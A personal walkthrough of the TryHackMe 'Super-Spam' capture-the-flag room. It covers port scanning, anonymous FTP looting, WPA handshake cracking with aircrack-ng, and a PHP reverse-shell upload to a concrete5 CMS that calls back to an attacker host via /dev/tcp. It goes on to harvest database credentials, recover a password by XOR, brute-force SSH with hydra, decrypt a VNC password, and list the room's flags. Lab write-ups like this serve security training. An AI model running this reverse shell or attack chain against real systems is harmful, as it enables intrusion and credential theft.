<h1 align="center">Super-Spam</h1>
<p align="center">2025, August 3<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>454</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Defeat the evil Super-Spam, and save the day!!</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/ac113a38-f5e3-4a8d-8758-8daae916ad48"><br>
Click <a href=https://tryhackme.com/room/superspamr">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/a2bf62b1-b986-48db-84fc-034d57d22730"></p>

<br>

<h2>Task 1 . Defeat Super-Spam</h2>
<h3>General Uvilix:</h3>
<p>Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! Beware, super-spam's evil powers are to confuse and deter his victims.<br>

Credits: ARZ101, DrXploiter, Aksheet, kiwiness, wraith0p</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<h3>nmap</h3>

```bash
:~/SuperSpam# rustscan -a TargetIP --ulimit 5500 -b 65535 -- -A -Pn
...
PORT     STATE SERVICE  REASON  VERSION
80/tcp   open  ssl/http syn-ack Apache/2.4.41 (Ubuntu)
|_http-generator: concrete5 - 8.5.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home :: Super-Spam
4012/tcp open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
4019/tcp open  ftp      syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:AttackIP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
5901/tcp open  vnc      syn-ack VNC (protocol 3.8)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_vnc-info: ERROR: Script execution failed (use -d to debug)
6001/tcp open  X11      syn-ack (access denied)
```

<br>

<h3>nc</h3>


```bash
:~/SuperSpam# nc TargetIP 4019
220 (vsFTPd 3.0.5)
```

```bash
:~/SuperSpam# nc TargetIP 4012
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
```


```bash
:~/SuperSpam# nc TargetIP 5901
RFB 003.008
```

<br>

<h3>FTP</h3>

```bash
:~/SuperSpam# ftp TargetIP 4019
Connected to TargetIP.
220 (vsFTPd 3.0.5)
Name (TargetIP:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (526 bytes).
226 Transfer complete.
526 bytes received in 0.09 secs (6.0326 kB/s)
ftp> cd IDS_logs
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         14132 Feb 20  2021 12-01-21.req.pcapng
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed.s
...
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 13-01-21.pcap
...
-rw-r--r--    1 ftp      ftp         11004 Feb 20  2021 14-01-21.pcapng
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 16-01-21.pcap
...
ftp> get 14-01-21.pcapng
...
11004 bytes received in 0.10 secs (105.8582 kB/s)
ftp> get 16-01-21.pcap
...
74172 bytes received in 0.11 secs (636.1581 kB/s)
ftp> get 12-01-21.req.pcapng
...
14132 bytes received in 0.00 secs (5.1558 MB/s)
ftp> get 13-01-21.pcap
...
74172 bytes received in 0.00 secs (60.0475 MB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .cap
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> cd .cap
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp           249 Feb 20  2021 .quicknote.txt
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
226 Directory send OK.
ftp> get .quicknote.txt
...
249 bytes received in 0.00 secs (634.8931 kB/s)
ftp> get SamsNetwork.cap
...
370488 bytes received in 0.08 secs (4.4224 MB/s)
ftp> exit
221 Goodbye.
```

<br>

<h3>note.txt</h3>

```bash
:~/SuperSpam# cat note.txt
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)
```

<br>

<h3>.quicknote.txt</h3>

```bash
:~/SuperSpam# cat .quicknote.txt
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!
```

<br>

<h3>Wireshark</h3>

<p>

- Wireless LAN<br>
- Infinixmofil_36...</p>

```bash
:~/SuperSpam# wireshark SamsNetwork.cap
```

<img width="1297" height="526" alt="image" src="https://github.com/user-attachments/assets/ba6a3f95-8ad3-488d-8110-e8cd70152324" />

<img width="1312" height="205" alt="image" src="https://github.com/user-attachments/assets/ed2053c3-c63f-4dd1-b841-49378a22258b" />


<br>

<h3></h3>

```bash
:~/SuperSpam# aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt
```

<img width="633" height="247" alt="image" src="https://github.com/user-attachments/assets/0b63feaf-9ae4-4458-a076-73ceabd1184a" />


<p>Take a long break ...</p>

<br>

<p>

- <code>aircrack-ng</code> uncovered the key</p>

```bash
                             Aircrack-ng 1.6 

      [00:14:03] 831707/14344391 keys tested (1003.05 k/s) 

      Time left: 3 hours, 44 minutes, 32 seconds                 5.80%

                           KEY FOUND! [ sandiago ]


      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0
```

<img width="653" height="263" alt="image" src="https://github.com/user-attachments/assets/efc51ddc-95c0-43c9-af4e-b05881bf1071" />

<br>

<h3>Wireshark</h3>

<p>

- <code>Edit</code> > <code>Preferences</code> > <code>Protocols</code> > <code>IEEE 802.11</code> > Decryption keys <code>Edit...</code><br>
- clicked <code>+</code><br>
- selected <code>wpa-pwd</code> for Key type<br>
- pasted the key uncovered by aircrack-ng<br>
- hit <code>ENTER</code><br>
- clicked <code>OK</code><br>
- clicked <code>Apply</code><br>
- clicked <code>OK</code></p>

<img width="1057" height="660" alt="image" src="https://github.com/user-attachments/assets/9dfa874e-418d-47d3-9f0c-6dbe3428c667" />

<img width="1052" height="219" alt="image" src="https://github.com/user-attachments/assets/9d561e39-1b28-4197-81c2-78941b3616b9" />

<p>

- followed <code>TCP stream</code></p>

<img width="1303" height="450" alt="image" src="https://github.com/user-attachments/assets/ccb120c0-d6ba-4973-bacc-65ccc7ecd6f2" />

<br>

<h3>Web 80</h3>

<p>

- concrete5 - 8.5.2</p>

<img width="1123" height="272" alt="image" src="https://github.com/user-attachments/assets/ff71cbc1-a0bc-474a-868a-ab66b2965a8e" />

<img width="1124" height="260" alt="image" src="https://github.com/user-attachments/assets/8ac88568-0358-421c-a53f-50815b54f746" />

<img width="1109" height="121" alt="image" src="https://github.com/user-attachments/assets/ba075ff9-7f5b-4868-ac65-5fb5cec1f53c" />

<img width="1116" height="548" alt="image" src="https://github.com/user-attachments/assets/3c41f4d5-d55e-4606-bac9-31831141b0df" />


<br>
<br>

> 1.1. <em>What CMS and version is being used? (format: wordpress x.x.x)</em><br><a id='1.1'></a>
>> <strong><code>concrete5 - 8.5.2</code></strong><br>
<p></p>

<br>

<h3>superspam.thm/concrete5/index.php</h3>

<img width="1126" height="510" alt="image" src="https://github.com/user-attachments/assets/b25af917-ece6-42d6-8830-4ebde43ba6f4" />

<br>

<h3>/concrete5/index.php/blog/a-beautiful-blog</h3>
<p>

- Apr 9, 2014 4:30 PM<br>
- Adam_Admin</p>

<h3>superspam.thm/concrete5/index.php/blog/linux-bloggerscom</h3>
<p>

- Apr 9, 2021 2:01 PM<br>
- Adam_Admin</p>

<img width="1121" height="359" alt="image" src="https://github.com/user-attachments/assets/041269a6-9536-4841-bbfc-ee62e0850687" />

<h3>superspam.thm/concrete5/index.php/blog/Lorem</h3>
<p>

- Apr 9, 2021 2:08 PM<br>
- Donald_Dump</p>

<h3>superspam.thm/concrete5/index.php/blog/Ipsum</h3>
<p>

- Apr 9, 2021 2:16 PM<br>
- Lucy_Loser</p>

<h3>superspam.thm/concrete5/index.php/blog/neque-porro-quisquam</h3>
<p>

- Apr 9, 2021 2:17 PM<br>
- Benjamin_Blogger</p>

<br>

<h3>/concrete5/index.php/login</h3>

<img width="1121" height="504" alt="image" src="https://github.com/user-attachments/assets/c38d3e57-7902-41d6-a584-56cdd7872650" />

<img width="1121" height="660" alt="image" src="https://github.com/user-attachments/assets/9edaff46-ab6e-4492-b3a9-a80ae1f4ebf2" />

<br>

<h3>Concrete5</h3>
<p>https://github.com/RosanaFSS/Cybersecurity-Journey-TryHackMe/new/CTFs-%26-Infos</p>

<img width="1010" height="683" alt="image" src="https://github.com/user-attachments/assets/da0bcc7b-9dca-47a7-b4fd-3154027f214e" />

<br>

<h3>Reverse Shell</h3>

<p>

- crafted a <code>rev.php</code></p>

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/AttackIP/4444 0>&1'");?>
```


<h3></h3>

<p>

- clicked <code>System & Settings</code><br>
- clicked <code>Allowed File Types</code><br>
- added <code>php</code><br>
- saved<br>
- navigated to <code>File</code><br>
- clicked <code>Upload Filed</code><br>
- dragged <code>rev.php</code> to the upload panel<br>
- clicked <code>Close</code><br>
- navigated to the link provided for the uploaded file<br>
- got the shell<br>
- stabilized the shell</p>



<img width="1121" height="497" alt="image" src="https://github.com/user-attachments/assets/2a5fa149-2a68-48cc-bb7c-8c11ee6ed0bc" />

<img width="1125" height="494" alt="image" src="https://github.com/user-attachments/assets/d6012033-7dda-4a9c-985a-e2413e679d5e" />

<img width="1065" height="439" alt="image" src="https://github.com/user-attachments/assets/b5780841-fd8d-432a-8482-1112e286424a" />

<img width="1102" height="471" alt="image" src="https://github.com/user-attachments/assets/7ceaf197-c738-4e1e-a4c8-a26a4b2bbd1b" />

<img width="1121" height="31" alt="image" src="https://github.com/user-attachments/assets/0db77428-8153-4f03-bd5e-c094c29b3bd9" />

<img width="1050" height="180" alt="image" src="https://github.com/user-attachments/assets/839ffbd2-c7b6-4e8f-b2d5-cda63322a1e3" />

```bash
:~/SuperSpam# nc -nlvp 4444
...
<w/html/concrete5/application/files/2117/5425/5942$ which python3
which python3
/usr/bin/python3
<w/html/concrete5/application/files/2117/5425/5942$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
<942$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<w/html/concrete5/application/files/2117/5425/5942$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/SuperSpam# stty raw -echo; fg
nc -nlvp 4444

<w/html/concrete5/application/files/2117/5425/5942$ export TERM=xterm
www-data@ip-10-201-83-141:/var/www/html/concrete5/application/files/2117/5425/5942$
```

```bash
www-data@ip-10-201-83-141:/var/www/html/concrete5/application/files/2117/5425/5942$ whoami;id;pwd
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/concrete5/application/files/2117/5425/5942
```

```bash
www-dataa@ip-10-201-4-179:/var/www/html/concrete5/application/config$ cat databas 
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'concrete5_db',
            'username' => 'concrete5',
            'password' => 'arzwashere023r3z0z0z08973jhkjii££$',
            'character_set' => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
        ],
    ],
];
```

```bash
www-data@ip-10-201-4-179:/home$ ls -lah
total 36K
drwxr-xr-x  9 root             root             4.0K Jul  3 18:08 .
drwxr-xr-x 23 root             root             4.0K Aug  3 22:13 ..
drwxr-xr-x  2 benjamin_blogger benjamin_blogger 4.0K Apr  9  2021 benjamin_blogger
drw-rw----  6 donalddump       donalddump       4.0K Apr  9  2021 donalddump
drwxr-xr-x  7 lucy_loser       lucy_loser       4.0K Apr  9  2021 lucy_loser
drwxr-xr-x  5 root             root             4.0K May 30  2021 personal
drwxr-xr-x  2 ssm-user         ssm-user         4.0K Jun 29 12:56 ssm-user
drwxr-xr-x  4 super-spam       super-spam       4.0K Apr  9  2021 super-spam
drwxr-xr-x  4 ubuntu           ubuntu           4.0K Jul  3 18:09 ubuntu
```

<p><em>users.txt</em></p>

```bash
benjamin_blogger
donalddump
lucy_loser
personal
ssm-user
ubuntu
```


<br>

> 1.2. <em>What is the user flag?</em><br><a id='1.2'></a>
>> <strong><code>flag{-eteKc=skineogyls45«ey?t+du8}</code></strong><br>
<p></p>


```bash
www-data@ip-10-201-83-141:/home$ find / -type f -name flag.txt 2>/dev/null
/home/personal/Work/flag.txt
```

```bash
www-data@ip-10-201-83-141:/home/personal/Work$ cat flag.txt
user_flag: flag{-eteKc=skineogyls45«ey?t+du8}
```

```bash
www-data@ip-10-201-83-141:/home/personal/Workload$ ls -lah
total 12K
drwxr-xr-x 2 root root 4.0K May 30  2021 .
drwxr-xr-x 5 root root 4.0K May 30  2021 ..
-rw-r--r-- 1 root root  215 Feb 20  2021 nextEvilPlan.txt
```

```bash
www-data@ip-10-201-83-141:/home/personal/Workload$ cat nextEvilPlan.txt
My next evil plan is to ensure that all linux filesystems are disorganised so that these 
linux users will never find what they are looking for (whatever that is)... That should
stop them from gaining back control!
```


<br>

> 1.3. <em>What type of encryption did super-spam use to send his encrypted messages?</em><br><a id='1.3'></a>
>> <strong><code>XOR</code></strong><br>
<p></p>

```bash
www-data@ip-10-201-83-141:/home/lucy_loser$ ls
calcs.txt  prices  work
www-data@ip-10-201-83-141:/home/lucy_loser$ ls -lah
total 44K
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 .
drwxr-xr-x 9 root       root       4.0K Jul  3 18:08 ..
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .MessagesBackupToGalactic
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lucy_loser lucy_loser  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 lucy_loser lucy_loser 3.7K Feb 20  2021 .bashrc
drwx------ 2 lucy_loser lucy_loser 4.0K Feb 20  2021 .cache
drwx------ 3 lucy_loser lucy_loser 4.0K Feb 20  2021 .gnupg
-rw-r--r-- 1 lucy_loser lucy_loser  807 Feb 20  2021 .profile
-rw-r--r-- 1 root       root         28 Feb 24  2021 calcs.txt
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 prices
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 work
www-data@ip-10-201-83-141:/home/lucy_loser$ cat calcs.txt
Suzy logs. to be completed.
```

```bash
www-data@ip-10-201-83-141:/home/lucy_loser/.MessagesBackupToGalactic$ ls
c1.png	 c2.png  c4.png  c6.png  c8.png  d.png	   xored.py
c10.png  c3.png  c5.png  c7.png  c9.png  note.txt
```

```bash
www-data@ip-10-201-83-141:/home/lucy_loser/.MessagesBackupToGalactic$ cat note.txt
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
```

<p>

- <code>newpixel.append(pixel_1[p] ^ pixel_2[p]) # ^ --> use to xor two Values</code></p>

```bash
www-data@ip-10-201-83-141:/home/lucy_loser/.MessagesBackupToGalactic$ cat xored. 
from PIL import Image

print("[!] Note Add extention also.")

pic1_name=input("[-] Enter First Image: " )
pic2_name=input("[-] Enter Second Image: ")
out_name=input("[-] Enter Name of The output image:")


pic1=Image.open(pic1_name)
print("[+] Reading pic1")  #finding the size of picture1 
pic2=Image.open(pic2_name)
print("[+] Reading pic2") #finding the size of picture2

#pic2=pic1.resize(pic1.size) #resizing the pic2 according to pic1
#print("[+] pic2 resized Successfully.")

'''
so that we can xor each and every coordinate of both the pictures
'''

print(pic2) #After Resizing

x_cord_pic1=pic1.size[0]
y_cord_pic1=pic1.size[1]

newpic = Image.new('RGB',pic1.size) # Creating NEW image

for y in range(y_cord_pic1):
    for x in range(x_cord_pic1):
        pixel_1=pic1.getpixel((x,y))
        pixel_2=pic2.getpixel((x,y))
        newpixel =[]
        for p in range(len(pixel_1[:3])): #for all three values

            newpixel.append(pixel_1[p] ^ pixel_2[p]) # ^ --> use to xor two Values
        newpixel=tuple(newpixel)
        #print(newpixel)
        newpic.putpixel((x,y),newpixel)
print("[+] Xored successfully")
print("[+]  Successfully saved as "+out_name)
newpic.save(out_name)
```

<br>

> 1.4. <em>What key information was embedded in one of super-spam's encrypted messages?</em><br><a id='1.4'></a>
>> <strong><code>$$L3qwert30kcool</code></strong><br>
<p></p>

```bash
www-data@ip-10-201-83-141:/home$ ls -lah /etc/passwd
-rw-r--r-- 1 root root 2.4K Jul  3 18:08 /etc/passwd
```

```bash
www-data@ip-10-201-83-141:/home$ ls -lah /etc/shadow
-rw-r----- 1 root shadow 1.7K Aug  3 19:48 /etc/shadow
```

<p>

- root<br>
- super-spam<br>
- lucy_loser<br>
- benjamin_blogger<br>
- donalddump<br>
- ubuntu</p>

```bash
www-data@ip-10-201-83-141:/home$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
super-spam:x:1000:1004:,,,:/home/super-spam:/bin/bash
lucy_loser:x:1001:1005:,,,:/home/lucy_loser:/bin/bash
benjamin_blogger:x:1002:1006:,,,:/home/benjamin_blogger:/bin/bash
donalddump:x:1003:1007:,,,:/home/donalddump:/bin/bash
ubuntu:x:1005:1010:Ubuntu:/home/ubuntu:/bin/bash
```

```bash
www-data@ip-10-201-83-141:/home$ uname -a
Linux ip-10-201-83-141 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
www-data@ip-10-201-83-141:/home/super-spam$ ls -lah
total 32K
drwxr-xr-x 4 super-spam super-spam 4.0K Apr  9  2021 .
drwxr-xr-x 9 root       root       4.0K Jul  3 18:08 ..
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 super-spam super-spam  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 super-spam super-spam 3.7K Feb 20  2021 .bashrc
drwx------ 2 super-spam super-spam 4.0K Feb 24  2021 .cache
drwx------ 3 super-spam super-spam 4.0K Feb 24  2021 .gnupg
-rw-r--r-- 1 super-spam super-spam  807 Feb 20  2021 .profile
-rw-r--r-- 1 root       root        251 Feb 24  2021 flagOfWindows
```

```bash
www-data@ip-10-201-83-141:/home/super-spam$ cat flagOfWindows
I am pleased to announce that our plan is going so well. I truly cannot wait to purge the galaxy of that inferior operating system, Linux.
Let this flag of windows stand strongly against the wind for all to see. A pure windows galaxy is what we want!
```

```bash
www-data@ip-10-201-83-141:/home/lucy_loser/.MessagesBackupToGalactic$ ls -lah
total 1.7M
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 ..
-rw-r--r-- 1 lucy_loser lucy_loser 169K Apr  8  2021 c1.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c10.png
-rw-r--r-- 1 lucy_loser lucy_loser 165K Apr  8  2021 c2.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c3.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c4.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c5.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c6.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c7.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c8.png
-rw-r--r-- 1 lucy_loser lucy_loser 170K Apr  8  2021 c9.png
-rw-r--r-- 1 lucy_loser lucy_loser  21K Apr  8  2021 d.png
-rw-r--r-- 1 lucy_loser lucy_loser  497 May 30  2021 note.txt
-rw-r--r-- 1 lucy_loser lucy_loser 1.2K Apr  8  2021 xored.py
```

```bash
www-data@ip-xx-xxx-x-xxx:/home/lucy_loser/.MessagesBackupToGalactic$ 
http.server-xx-xxx-x-xxx:/home/lucy_loser/.MessagesBackupToGalactic$ python3 -m  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
AttackIP  - - [03/Aug/2025 xx:xx:xx] code 404, message File not found
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /* HTTP/1.1" 404 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c1.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c10.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c2.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c3.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c4.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c5.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c6.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c7.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c8.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /c9.png HTTP/1.1" 200 -
AttackIP  - - [03/Aug/2025 xx:xx:xx] "GET /d.png HTTP/1.1" 200 -
```

<br>

<h3>eog</h3>

```bash
:~/SuperSpam# apt install eog
...
```

```bash
:~/SuperSpam# eog d.png
...
```

<p>$$L3qwert30kcool</p>

<img width="927" height="493" alt="image" src="https://github.com/user-attachments/assets/164b90f4-9002-413a-88da-c7dc322daade" />

<br>

<h3>Hydra</h3>

```bash
:~/SuperSpam# hydra -L users.txt -P password.txt ssh://superspam.thm -s 4012
```

<img width="1138" height="227" alt="image" src="https://github.com/user-attachments/assets/e99d2574-f32d-4060-86bd-e09f4ad505a3" />

<br>


<h3>Donalddump</h3>

```bash
www-data@ip-xx-xxx-x-xxx:/home/lucy_loser/.MessagesBackupToGalactic$$ su donalddump
Password: 
bash: /home/donalddump/.bashrc: Permission denied
donalddump@ip-xx-xxx-x-xxx:/home/lucy_loser/.MessagesBackupToGalactic$ 
```

```bash
donalddump@ip-xx-xxx-x-xxx:/home$ cd donalddump
bash: cd: donalddump: Permission denied
```

```bash
donalddump@ip-xx-xxx-x-xxx:$ ls -lah
total 44K
drwxrwxrwx 6 donalddump donalddump 4.0K Apr  9  2021 .
drwxr-xr-x 9 root       root       4.0K Jul  3 18:08 ..
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 donalddump donalddump  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 donalddump donalddump 3.7K Feb 20  2021 .bashrc
drwx------ 2 donalddump donalddump 4.0K Apr  8  2021 .cache
drwx------ 3 donalddump donalddump 4.0K Apr  8  2021 .gnupg
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 morning
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 notes
-rw-r--r-- 1 root       root          8 Apr  8  2021 passwd
-rw-r--r-- 1 donalddump donalddump  807 Feb 20  2021 .profile
-rw-rw-r-- 1 donalddump donalddump   36 Apr  9  2021 user.txt
```

<br>

<p>In Rustscan ...</p>

```bash
5901/tcp open  vnc      syn-ack VNC (protocol 3.8)
```

<br>

```bash
donalddump@ip-xx-xxx-x-xxx:$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
AttackIP - - [03/Aug/2025 xx:xx:xx] "GET /passwd HTTP/1.1" 200 -
```

```bash
:~/SuperSpam# file passwd
passwd: ISO-8859 text, with no line terminators
```

```bash
:~/SuperSpam# git clone https://github.com/jeroennijhof/vncpwd
Cloning into 'vncpwd'...
remote: Enumerating objects: 28, done.
remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28 (from 1)
Unpacking objects: 100% (28/28), 22.13 KiB | 1.38 MiB/s, done.
```

```bash
:~/SuperSpam# cd vncpwd
```

```bash
:~/SuperSpam/vncpwd# ls
d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd.c
```

```bash
:~/SuperSpam/vncpwd# gcc -o vncpwd vncpwd.c d3des.c
```

```bash
:~/SuperSpam/vncpwd# ls
d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd  vncpwd.c
```

```bash
:~/SuperSpam/vncpwd# ./vncpwd ~/SuperSpam/passwd
Password: vncpriv
```

<br>

<h3>xtightvncserver</h3>

```bash
~/SuperSpam# apt install xtightvncviewer
...
```

```bash
:~/SuperSpam# xtightvncviewer superspam.thm:5901
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password:
...
```

<img width="1009" height="357" alt="image" src="https://github.com/user-attachments/assets/a3e81355-b1eb-4d5e-a66a-86f0e526d2ce" />

<img width="1022" height="312" alt="image" src="https://github.com/user-attachments/assets/7d65d74a-ad7d-4503-9454-d415e64f34f5" />

```bash
# cat r00t.txt

what am i?: MZWGCZ33NF2GKZKLMRRHKPJ5NBVEWNWCU5MXKVLVG4WTMTS7PU======

KRUGS4ZANFZSA3TPOQQG65TFOIQSAWLPOUQG2YLZEBUGC5TFEBZWC5TFMQQHS33VOIQGEZLMN53GKZBAOBWGC3TFOQQHI2DJOMQHI2LNMUWCASDBMNVWK4RNNVQW4LBAMJ2XIICJEB3WS3DMEBRGKIDCMFRWWIDXNF2GQIDBEBRGSZ3HMVZCYIDNN5ZGKIDEMFZXIYLSMRWHSIDQNRQW4IDUN4QGOZLUEBZGSZBAN5TCA5DIMF2CA2LOMZSXE2LPOIQG64DFOJQXI2LOM4QHG6LTORSW2LBAJRUW45LYFYQA==== 
```

<br>

<img width="1173" height="255" alt="image" src="https://github.com/user-attachments/assets/4b451e31-34d4-47e3-9f49-6113c885e0b3" />

<br>

> 1.5. <em>What is the root flag?</em><br><a id='1.5'></a>
>> <strong><code>flag{iteeKdbu==hjK6§YuUu7-6N_}</code></strong><br>
<p></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/bb196c8c-e4c0-4f1d-b9c0-93d9e399ef6b"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/20c21aa9-3bc4-4f5d-8a66-aa685a49ebdb"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
